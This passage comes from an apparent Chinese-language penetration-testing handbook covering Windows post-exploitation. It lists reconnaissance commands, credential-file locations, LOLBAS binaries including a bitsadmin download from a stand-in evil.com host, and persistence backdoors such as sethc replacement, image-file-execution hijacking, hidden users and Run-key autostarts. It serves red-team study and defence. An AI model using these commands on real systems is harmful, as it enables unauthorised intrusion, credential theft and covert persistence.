<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">nltest</span> <span class="pre">/dclist:xx</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">Get-NetDomain</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">Get-NetDomainController</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">group</span> <span class="pre">&quot;Domain</span> <span class="pre">controllers&quot;</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id3">
<h4>用户信息<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>查看用户</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">user</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">whoami</span></code> / <code class="docutils literal notranslate"><span class="pre">whoami</span> <span class="pre">/priv</span></code> / <code class="docutils literal notranslate"><span class="pre">whoami</span> <span class="pre">/all</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">wmic</span> <span class="pre">useraccount</span> <span class="pre">get</span> <span class="pre">/ALL</span> <span class="pre">/format:csv</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>用户特权信息 <code class="docutils literal notranslate"><span class="pre">whoami</span> <span class="pre">/priv</span></code></li>
<li>查看当前权限 <code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">localgroup</span> <span class="pre">administrators</span></code></li>
<li>查看在线用户 <code class="docutils literal notranslate"><span class="pre">quser</span></code> / <code class="docutils literal notranslate"><span class="pre">qwinsta</span></code> / <code class="docutils literal notranslate"><span class="pre">query</span> <span class="pre">user</span></code></li>
<li>查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域 <code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">config</span> <span class="pre">Workstation</span></code></li>
<li>ACL 信息 <code class="docutils literal notranslate"><span class="pre">get-acl</span></code></li>
</ul>
</div>
<div class="section" id="id4">
<h4>网络信息<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>内网网段信息</li>
<li>网卡信息 <code class="docutils literal notranslate"><span class="pre">ipconfig</span></code></li>
<li>外网出口</li>
<li>ARP表 <code class="docutils literal notranslate"><span class="pre">arp</span> <span class="pre">-a</span></code></li>
<li>路由表 <code class="docutils literal notranslate"><span class="pre">route</span> <span class="pre">print</span></code></li>
<li>监听的端口 <code class="docutils literal notranslate"><span class="pre">netstat</span> <span class="pre">-ano</span></code></li>
<li>连接的端口</li>
<li><dl class="first docutils">
<dt>端口信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">Get-NetTCPConnection</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>hosts文件</li>
<li>主备 DNS</li>
<li><dl class="first docutils">
<dt>DNS缓存</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">ipconfig</span> <span class="pre">/displaydns</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">Get-CimInstance</span> <span class="pre">-Namespace</span> <span class="pre">root/StandardCimv2</span> <span class="pre">-ClassName</span> <span class="pre">MSFT_DNSClientCache</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>探测出网情况</dt>
<dd><ul class="first last">
<li><cite>powershell -c &quot;1..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect('allports.exposed',$_)) $_ } 2&gt;$null&quot;</cite></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id5">
<h4>防火墙<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>查看防火墙状态 <code class="docutils literal notranslate"><span class="pre">netsh</span> <span class="pre">advfirewall</span> <span class="pre">show</span> <span class="pre">allprofiles</span></code></li>
<li>防火墙日志目录 <code class="docutils literal notranslate"><span class="pre">netsh</span> <span class="pre">firewall</span> <span class="pre">show</span> <span class="pre">logging</span></code></li>
<li>防火墙规则 <code class="docutils literal notranslate"><span class="pre">netsh</span> <span class="pre">advfirewall</span> <span class="pre">firewall</span> <span class="pre">show</span> <span class="pre">rule</span> <span class="pre">name=all</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">netsh</span> <span class="pre">firewall</span> <span class="pre">show</span> <span class="pre">config</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">netsh</span> <span class="pre">firewall</span> <span class="pre">show</span> <span class="pre">state</span></code></li>
</ul>
</div>
<div class="section" id="id6">
<h4>密码信息<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Windows RDP连接记录</li>
<li>浏览器中保存的账号密码</li>
<li>系统密码管理器中的各种密码</li>
<li><dl class="first docutils">
<dt>无人值守安装文件中的密码信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">C:\sysprep.inf</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">C:\sysprep\sysprep.xml</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">C:\Windows\Panther\Unattend\Unattended.xml</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">C:\Windows\Panther\Unattended.xml</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id7">
<h4>票据信息<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">cmdkey</span> <span class="pre">/l</span></code></li>
<li>klist</li>
<li>msf meterpreter</li>
</ul>
</div>
<div class="section" id="id8">
<h4>特殊文件<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>文档</dt>
<dd><ul class="first last">
<li>xlsx / xls</li>
<li>docx / doc</li>
<li>pptx / ppt</li>
<li>vsdx / vsd</li>
<li>md / txt</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>压缩文件</dt>
<dd><ul class="first last">
<li>zip / rar / 7z</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>VPN配置</dt>
<dd><ul class="first last">
<li>ovpn</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>代码</dt>
<dd><ul class="first last">
<li>py / php / jsp / aspx / asp / sql</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>配置文件</dt>
<dd><ul class="first last">
<li>conf / ini / xml</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>特定关键字</dt>
<dd><ul class="first last">
<li>账号 / 账户 / 登录 / login / user</li>
<li>密码 / pass</li>
<li>代码 / 文档 / 交接 / 备份 / git / svn</li>
<li>邮箱 / 通讯录 / 集群 / 办公</li>
<li>代理 / 内网 / VPN</li>
<li>设备 / 资产</li>
<li>系统 / 运维 / 拓扑 / 网络 / IT</li>
<li>后台 / 管理员 / 数据库</li>
<li>监控 / 隔离 / 防火墙 / 网闸 / 巡检</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id9">
<h4>其他<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>启用的共享文件夹</li>
<li>回收站</li>
<li>最近运行的命令</li>
<li>访问文件历史记录</li>
<li><dl class="first docutils">
<dt>查看补丁安装情况</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">wmic</span> <span class="pre">qfe</span> <span class="pre">get</span> <span class="pre">Caption,Description,HotFixID,InstalledOn</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>日志与事件信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">wevtutil</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">eventvwr</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>注册表信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">reg</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>安装的各类 agent 监控软件</li>
<li>安装的杀毒软件</li>
<li><dl class="first docutils">
<dt>查看/设置后缀关联</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">assoc</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">assoc</span> <span class="pre">.ext=example</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>PowerShell 版本</li>
<li>.Net 版本</li>
<li>Wi-Fi 密码</li>
</ul>
</div>
</div>
<span id="document-intranet/winpersistence"></span><div class="section" id="windows">
<h3>持久化 - Windows<a class="headerlink" href="#windows" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>隐藏文件<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>创建系统隐藏文件</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">attrib</span> <span class="pre">+s</span> <span class="pre">+a</span> <span class="pre">+r</span> <span class="pre">+h</span> <span class="pre">filename</span></code> / <code class="docutils literal notranslate"><span class="pre">attrib</span> <span class="pre">+s</span> <span class="pre">+h</span> <span class="pre">filename</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>利用NTFS ADS (Alternate　Data　Streams) 创建隐藏文件</li>
<li><dl class="first docutils">
<dt>利用Windows保留字</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="lolbas">
<h4>LOLBAS<a class="headerlink" href="#lolbas" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt Graeber发现，最终Philip Goh提出的概念。</p>
<p>这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等。</p>
</div>
<div class="section" id="id3">
<h5>常见程序<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>appsyncvpublishing.exe</dt>
<dd><ul class="first last">
<li>执行powershell</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>bitsadmin.exe</dt>
<dd><ul class="first last">
<li>下载文件 <code class="docutils literal notranslate"><span class="pre">bitsadmin</span> <span class="pre">/transfer</span> <span class="pre">&lt;job_name&gt;</span> <span class="pre">/priority</span> <span class="pre">&lt;priority&gt;</span> <span class="pre">&lt;remote_path&gt;</span> <span class="pre">&lt;local_path&gt;</span></code></li>
<li>下载文件 <code class="docutils literal notranslate"><span class="pre">bitsadmin</span> <span class="pre">/create</span> <span class="pre">1</span> <span class="pre">bitsadmin</span> <span class="pre">/addfile</span> <span class="pre">1</span> <span class="pre">https://evil.com/autoruns.exe</span> <span class="pre">c:\data\playfolder\autoruns.exe</span> <span class="pre">bitsadmin</span> <span class="pre">/RESUME</span> <span class="pre">1</span> <span class="pre">bitsadmin</span> <span class="pre">/complete</span> <span class="pre">1</span></code></li>
<li>复制文件 <code class="docutils literal notranslate"><span class="pre">bitsadmin</span> <span class="pre">/create</span> <span class="pre">1</span> <span class="pre">&amp;</span> <span class="pre">bitsadmin</span> <span class="pre">/addfile</span> <span class="pre">1</span> <span class="pre">c:\windows\system32\cmd.exe</span> <span class="pre">c:\data\playfolder\cmd.exe</span> <span class="pre">&amp;</span> <span class="pre">bitsadmin</span> <span class="pre">/RESUME</span> <span class="pre">1</span> <span class="pre">&amp;</span> <span class="pre">bitsadmin</span> <span class="pre">/Complete</span> <span class="pre">1</span> <span class="pre">&amp;</span> <span class="pre">bitsadmin</span> <span class="pre">/reset</span></code></li>
<li>代码执行 <code class="docutils literal notranslate"><span class="pre">bitsadmin</span> <span class="pre">/create</span> <span class="pre">1</span> <span class="pre">&amp;</span> <span class="pre">bitsadmin</span> <span class="pre">/addfile</span> <span class="pre">1</span> <span class="pre">c:\windows\system32\cmd.exe</span> <span class="pre">c:\data\playfolder\cmd.exe</span> <span class="pre">&amp;</span> <span class="pre">bitsadmin</span> <span class="pre">/SetNotifyCmdLine</span> <span class="pre">1</span> <span class="pre">c:\data\playfolder\cmd.exe</span> <span class="pre">NULL</span> <span class="pre">&amp;</span> <span class="pre">bitsadmin</span> <span class="pre">/RESUME</span> <span class="pre">1</span> <span class="pre">&amp;</span> <span class="pre">bitsadmin</span> <span class="pre">/Reset</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>cdb.exe</li>
<li><dl class="first docutils">
<dt>certutil.exe</dt>
<dd><ul class="first last">
<li>可安装、备份、删除、管理和执行证书</li>
<li>证书存储相关功能</li>
</ul>
</dd>
</dl>
</li>
<li>cmd.exe</li>
<li>cmstp.exe</li>
<li><dl class="first docutils">
<dt>control.exe</dt>
<dd><ul class="first last">
<li><a class="reference external" href="https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/">加载dll</a></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>csc.exe</dt>
<dd><ul class="first last">
<li>编译 C# 载荷</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>cscript.exe</dt>
<dd><ul class="first last">
<li>执行脚本</li>
</ul>
</dd>
</dl>
</li>
<li>extexport.exe</li>
<li><dl class="first docutils">
<dt>expand.exe</dt>
<dd><ul class="first last">
<li>展开一个或多个压缩文件</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>forfiles.exe</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">forfiles</span> <span class="pre">/p</span> <span class="pre">c:\windows\system32</span> <span class="pre">/m</span> <span class="pre">notepad.exe</span> <span class="pre">/c</span> <span class="pre">calc.exe</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>mofcomp.exe</li>
<li><dl class="first docutils">
<dt>msbuild.exe</dt>
<dd><ul class="first last">
<li>构建应用程序</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>mshta.exe</dt>
<dd><ul class="first last">
<li>HTML应用</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>msiexec.exe</dt>
<dd><ul class="first last">
<li>安装msi</li>
<li>加载dll</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>msxsl.exe</dt>
<dd><ul class="first last">
<li>处理XSL程序</li>
</ul>
</dd>
</dl>
</li>
<li>netsh.exe</li>
<li><dl class="first docutils">
<dt>installutil.exe</dt>
<dd><ul class="first last">
<li>安装/卸载程序组件</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>IEExec.exe</dt>
<dd><ul class="first last">
<li>.NET Framework附带程序</li>
</ul>
</dd>
</dl>
</li>
<li>powershell.exe</li>
<li>psexec.exe</li>
<li><dl class="first docutils">
<dt>reg.exe</dt>
<dd><ul class="first last">
<li>注册表控制台</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>regedit.exe</dt>
<dd><ul class="first last">
<li>注册表修改</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>regsvr32.exe</dt>
<dd><ul class="first last">
<li>注册动态链接库/ActiveX控件</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>rundll32.exe</dt>
<dd><ul class="first last">
<li>执行DLL文件中的内部函数</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>sc.exe</dt>
<dd><ul class="first last">
<li>查看服务状态管理</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>schtasks.exe</dt>
<dd><ul class="first last">
<li>定时计划任务</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>shred</dt>
<dd><ul class="first last">
<li>重复写入文件，防止文件恢复</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>type.exe</dt>
<dd><ul class="first last">
<li>利用ads隐藏文件 <code class="docutils literal notranslate"><span class="pre">type</span> <span class="pre">&lt;filepath&gt;</span> <span class="pre">&lt;target_file:ads&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>wmic.exe</dt>
<dd><ul class="first last">
<li>Windows管理工具</li>
</ul>
</dd>
</dl>
</li>
<li>windbg.exe</li>
<li>winrm.exe</li>
<li><dl class="first docutils">
<dt>wscript.exe</dt>
<dd><ul class="first last">
<li>脚本引擎</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>waitfor.exe</dt>
<dd><ul class="first last">
<li>用于同步网络中计算机，可以发送或等待系统上的信号。</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<div class="section" id="id4">
<h4>后门<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<div class="section" id="sethc">
<h5>sethc<a class="headerlink" href="#sethc" title="永久链接至标题">¶</a></h5>
<p><code class="docutils literal notranslate"><span class="pre">sethc.exe</span></code> 是 Windows系统在用户按下五次shift后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换 <code class="docutils literal notranslate"><span class="pre">sethc.exe</span></code> 的方式留下后门，在密码输入页面输入五次shift即可获得权限。</p>
</div>
<div class="section" id="id5">
<h5>映像劫持<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>在高版本的Windows中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。</p>
<p>具体操作为在注册表的 <code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows</span> <span class="pre">NT\CurrentVersion\Image</span> <span class="pre">File</span> <span class="pre">Execution</span> <span class="pre">Option</span></code> 下添加项 <code class="docutils literal notranslate"><span class="pre">sethc.exe</span></code> ，然后在 <code class="docutils literal notranslate"><span class="pre">sethc.exe</span></code> 这个项中添加 <code class="docutils literal notranslate"><span class="pre">debugger</span></code> 键，键值为恶意程序的路径。</p>
</div>
<div class="section" id="id6">
<h5>定时任务<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>Windows下有 <code class="docutils literal notranslate"><span class="pre">schtasks</span></code> 和 <code class="docutils literal notranslate"><span class="pre">at</span></code> 两种计划任务机制。 其中 <code class="docutils literal notranslate"><span class="pre">at</span></code> 在较高版本的Windows中已经弃用。</p>
<p>设置命令为 <code class="docutils literal notranslate"><span class="pre">schtasks</span> <span class="pre">/create</span> <span class="pre">/tn</span> <span class="pre">&quot;TEST_OnLogon&quot;</span> <span class="pre">/sc</span> <span class="pre">onlogon</span> <span class="pre">/tr</span> <span class="pre">&quot;cmd.exe</span> <span class="pre">/c</span> <span class="pre">calc.exe&quot;</span></code> 、 <code class="docutils literal notranslate"><span class="pre">schtasks</span> <span class="pre">/create</span> <span class="pre">/tn</span> <span class="pre">&quot;TEST_OnStartup&quot;</span> <span class="pre">/sc</span> <span class="pre">onstart</span> <span class="pre">/ru</span> <span class="pre">system</span> <span class="pre">/tr</span> <span class="pre">&quot;cmd.exe</span> <span class="pre">/c</span> <span class="pre">calc.exe&quot;</span></code> 。删除命令为 <code class="docutils literal notranslate"><span class="pre">schtasks</span> <span class="pre">/delete</span> <span class="pre">/tn</span> <span class="pre">&quot;TEST_OnLogon&quot;</span> <span class="pre">/f</span></code> 。</p>
</div>
<div class="section" id="id7">
<h5>登录脚本<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>Windows可以在用户登录前执行脚本，使用 <code class="docutils literal notranslate"><span class="pre">HKLM\SOFTWARE\Microsoft\Windows</span> <span class="pre">NT\CurrentVersion\Winlogon\Userinit</span></code> 设置。</p>
<p>也可在 <code class="docutils literal notranslate"><span class="pre">HKCU\Environment\</span></code> 路径下设置 <code class="docutils literal notranslate"><span class="pre">UserInitMprLogonScript</span></code> 来实现。</p>
</div>
<div class="section" id="id8">
<h5>屏幕保护程序<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p>Windows可以自定义屏幕保护程序，使用 <code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Control</span> <span class="pre">Panel\Desktop</span></code> 设置。</p>
</div>
<div class="section" id="id9">
<h5>隐藏用户<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<p>Windows可以使用在用户名后加入 <code class="docutils literal notranslate"><span class="pre">$</span></code> 来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。</p>
<p>在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看。</p>
</div>
<div class="section" id="clr">
<h5>CLR<a class="headerlink" href="#clr" title="永久链接至标题">¶</a></h5>
<p>CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET产品构建的运行环境，可以粗略地理解为.NET虚拟机。</p>
<p>.NET程序的运行离不开CLR，因此可以通过劫持CLR的方式实现后门。</p>
</div>
<div class="section" id="winlogon-helper-dll">
<h5>Winlogon Helper DLL后门<a class="headerlink" href="#winlogon-helper-dll" title="永久链接至标题">¶</a></h5>
<p>Winlogon是一个Windows组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在Windows登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。</p>
<p>注册表位置如下：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows</span> <span class="pre">NT\CurrentVersion\Winlogon\Shell</span></code> 用于执行exe程序</li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows</span> <span class="pre">NT\CurrentVersion\Winlogon\Userinit</span></code> 用于执行exe程序</li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows</span> <span class="pre">NT\CurrentVersion\Winlogon\Notify</span></code> 用于执行dll文件</li>
</ul>
</div>
</div>
<div class="section" id="uac">
<h4>UAC<a class="headerlink" href="#uac" title="永久链接至标题">¶</a></h4>
<div class="section" id="id10">
<h5>简介<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<p>UAC (User Account Control) 是Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。</p>
<p>当用户登陆Windows时，每个用户都会被授予一个access token，这个token中有security identifier (SID) 的信息，决定了用户的权限。</p>
</div>
<div class="section" id="id11">
<h5>会触发UAC的操作<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>以管理员权限启动应用</li>
<li>修改系统、UAC设置</li>
<li>修改没有权限的文件或者目录（ %SystemRoot% / %ProgramFiles% 等 ）</li>
<li>修改ACL (access control list)</li>
<li>安装驱动</li>
<li>增删账户，修改账户类型，激活来宾账户</li>
</ul>
</div>
<div class="section" id="bypass">
<h5>ByPass<a class="headerlink" href="#bypass" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>DLL相关</li>
<li>进程注入</li>
<li>注册表</li>
</ul>
</div>
</div>
<div class="section" id="id12">
<h4>自启动<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<div class="section" id="id13">
<h5>基于注册表的自启动<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h5>
<p>通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是 <code class="docutils literal notranslate"><span class="pre">Run</span></code> 和 <code class="docutils literal notranslate"><span class="pre">RunOnce</span></code> ，其中RunOnce和Run区别在于RunOnce的键值只作用一次，执行完毕后会自动删除。</p>
<p>注册表如下：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</span></code></li>
</ul>
<p>基于策略的自启动注册表设置如下：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span></code></li>
</ul>
<p>设置启动文件夹注册表位置如下：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User</span> <span class="pre">Shell</span> <span class="pre">Folders</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell</span> <span class="pre">Folders</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell</span> <span class="pre">Folders</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User</span> <span class="pre">Shell</span> <span class="pre">Folders</span></code></li>
</ul>
<p>设置服务启动项注册表位置如下：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span></code></li>
</ul>
<p>用户自启动位置 <code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows</span> <span class="pre">NT\CurrentVersion\Winlogon\Userinit</span></code> 、 <code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows</span> <span class="pre">NT\CurrentVersion\Winlogon\Shell</span></code> ，其中 <code class="docutils literal notranslate"><span class="pre">Userinit</span></code> 键允许指定用逗号分隔的多个程序。</p>
<p>如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Control</span> <span class="pre">Panel\Desktop\ScreenSaveActive</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Control</span> <span class="pre">Panel\Desktop\ScreenSaverIsSecure</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Control</span> <span class="pre">Panel\Desktop\ScreenSaveTimeOut</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Control</span> <span class="pre">Panel\Desktop\SCRNSAVE.EXE</span></code></li>
</ul>
</div>
<div class="section" id="id14">
<h5>基于特定目录的自启动<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
<p>自启动目录， <code class="docutils literal notranslate"><span class="pre">C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start</span> <span class="pre">Menu\Programs\Startup</span></code> 目录对特定用户生效， <code class="docutils literal notranslate"><span class="pre">C:\ProgramData\Microsoft\Windows\Start</span> <span class="pre">Menu\Programs\StartUp</span></code> 对所有用户生效。在NT6以前，两个目录为 <code class="docutils literal notranslate"><span class="pre">C:\Documents</span> <span class="pre">and</span> <span class="pre">Settings\Username\Start</span> <span class="pre">Menu\Programs\StartUp</span></code> / <code class="docutils literal notranslate"><span class="pre">C:\Documents</span> <span class="pre">and</span> <span class="pre">Settings\All</span> <span class="pre">Users\Start</span> <span class="pre">Menu\Programs\StartUp</span></code> 。</p>
</div>
</div>
<div class="section" id="id15">
<h4>权限提升<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h4>
<p>权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的UAF或者其他类似的漏洞，以获得较高的权限。</p>
<p>逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。</p>
<div class="section" id="id16">
<h5>任意写文件利用<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h5>
<p>在Windows中用户可以写的敏感位置主要有以下这些</p>
<ul class="simple">
<li>用户自身的文件和目录，包括 <code class="docutils literal notranslate"><span class="pre">AppData</span></code> <code class="docutils literal notranslate"><span class="pre">Temp</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">C:\</span></code> ，默认情况下用户可以写入</li>
<li><code class="docutils literal notranslate"><span class="pre">C:\ProgramData</span></code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li>
